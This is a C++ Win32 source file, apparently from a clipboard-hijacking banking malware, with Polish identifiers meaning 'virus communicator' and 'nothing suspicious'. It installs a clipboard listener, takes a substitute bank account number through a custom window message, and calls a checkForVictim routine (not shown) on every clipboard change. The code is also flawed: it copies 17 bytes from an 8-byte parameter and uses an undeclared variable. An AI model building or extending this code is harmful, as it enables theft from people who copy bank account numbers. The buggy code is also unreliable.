#include "main.h"

constexpr char szClassName[] = "KomunikatorWirusa";
constexpr char windowTitle[] = "Komunikator Wirusa";
constexpr char msgName[] = "Nic podejrzanego";
HWND hwndThis;
UINT messageCode;
LPSTR bankAccount;
bool bAset;

int WINAPI WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nCmdShow)
{
	if (!init(hInstance)) return 1;

	MSG msg;

	while (GetMessage(&msg, NULL, 0, 0) > 0)
	{
		TranslateMessage(&msg);
		DispatchMessage(&msg);
	}
	return 0;
}

bool init(HINSTANCE hInstance)
{
	WNDCLASSEX wc;

	wc.cbSize = sizeof(WNDCLASSEX);
	wc.style = 0;
	wc.lpfnWndProc = WndProc;
	wc.cbClsExtra = 0;
	wc.cbWndExtra = 0;
	wc.hInstance = hInstance;
	wc.hIcon = NULL;
	wc.hCursor = LoadCursor(nullptr, IDC_ARROW);
	wc.hbrBackground = NULL;
	wc.lpszMenuName = NULL;
	wc.lpszClassName = szClassName;
	wc.hIconSm = NULL;

	if (!RegisterClassEx(&wc)) return false;

	hwndThis = CreateWindowEx(
		NULL,
		wc.lpszClassName,
		windowTitle,
		WS_CAPTION | WS_VISIBLE,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		CW_USEDEFAULT,
		NULL,
		NULL,
		hInstance,
		NULL
	);

	if (hwndThis == NULL) return false;
	if (!AddClipboardFormatListener(hwndThis)) return false;

	messageCode = RegisterWindowMessage(msgName);


	bankAccount = (LPSTR)malloc(17 * sizeof(char));
	bAset = false;

	return true;
}

LRESULT CALLBACK WndProc(HWND hwnd, UINT msg, WPARAM wParam, LPARAM lParam)
{
	if (msg == messageCode)
	{
		switch (wParam)
		{
		case 1:
			memcpy(bankAccount, &lParam, 17);
			bAset = true;
			break;
		}
	}
	switch (msg)
	{
	case WM_CREATE:
		hwndNextViewer = SetClipboardViewer(hwnd);
		break;
	case WM_CLIPBOARDUPDATE:
		checkForVictim();
		if (hwndNextViewer != NULL)
			SendMessage(hwndNextViewer, msg, wParam, lParam);
		break;
	case WM_CHANGECBCHAIN:
		if ((HWND)wParam == hwndNextViewer)
			hwndNextViewer = HWND(lParam);
		else
			if (hwndNextViewer != NULL)
				SendMessage(hwndNextViewer, msg, wParam, lParam);
		break;
	case WM_CLOSE:
		DestroyWindow(hwnd);
		break;
	case WM_DESTROY:
		ChangeClipboardChain(hwnd, hwndNextViewer);
		RemoveClipboardFormatListener(hwnd);
		PostQuitMessage(0);
		break;
	default:
		return DefWindowProc(hwnd, msg, wParam, lParam);
	}
	return 0;
}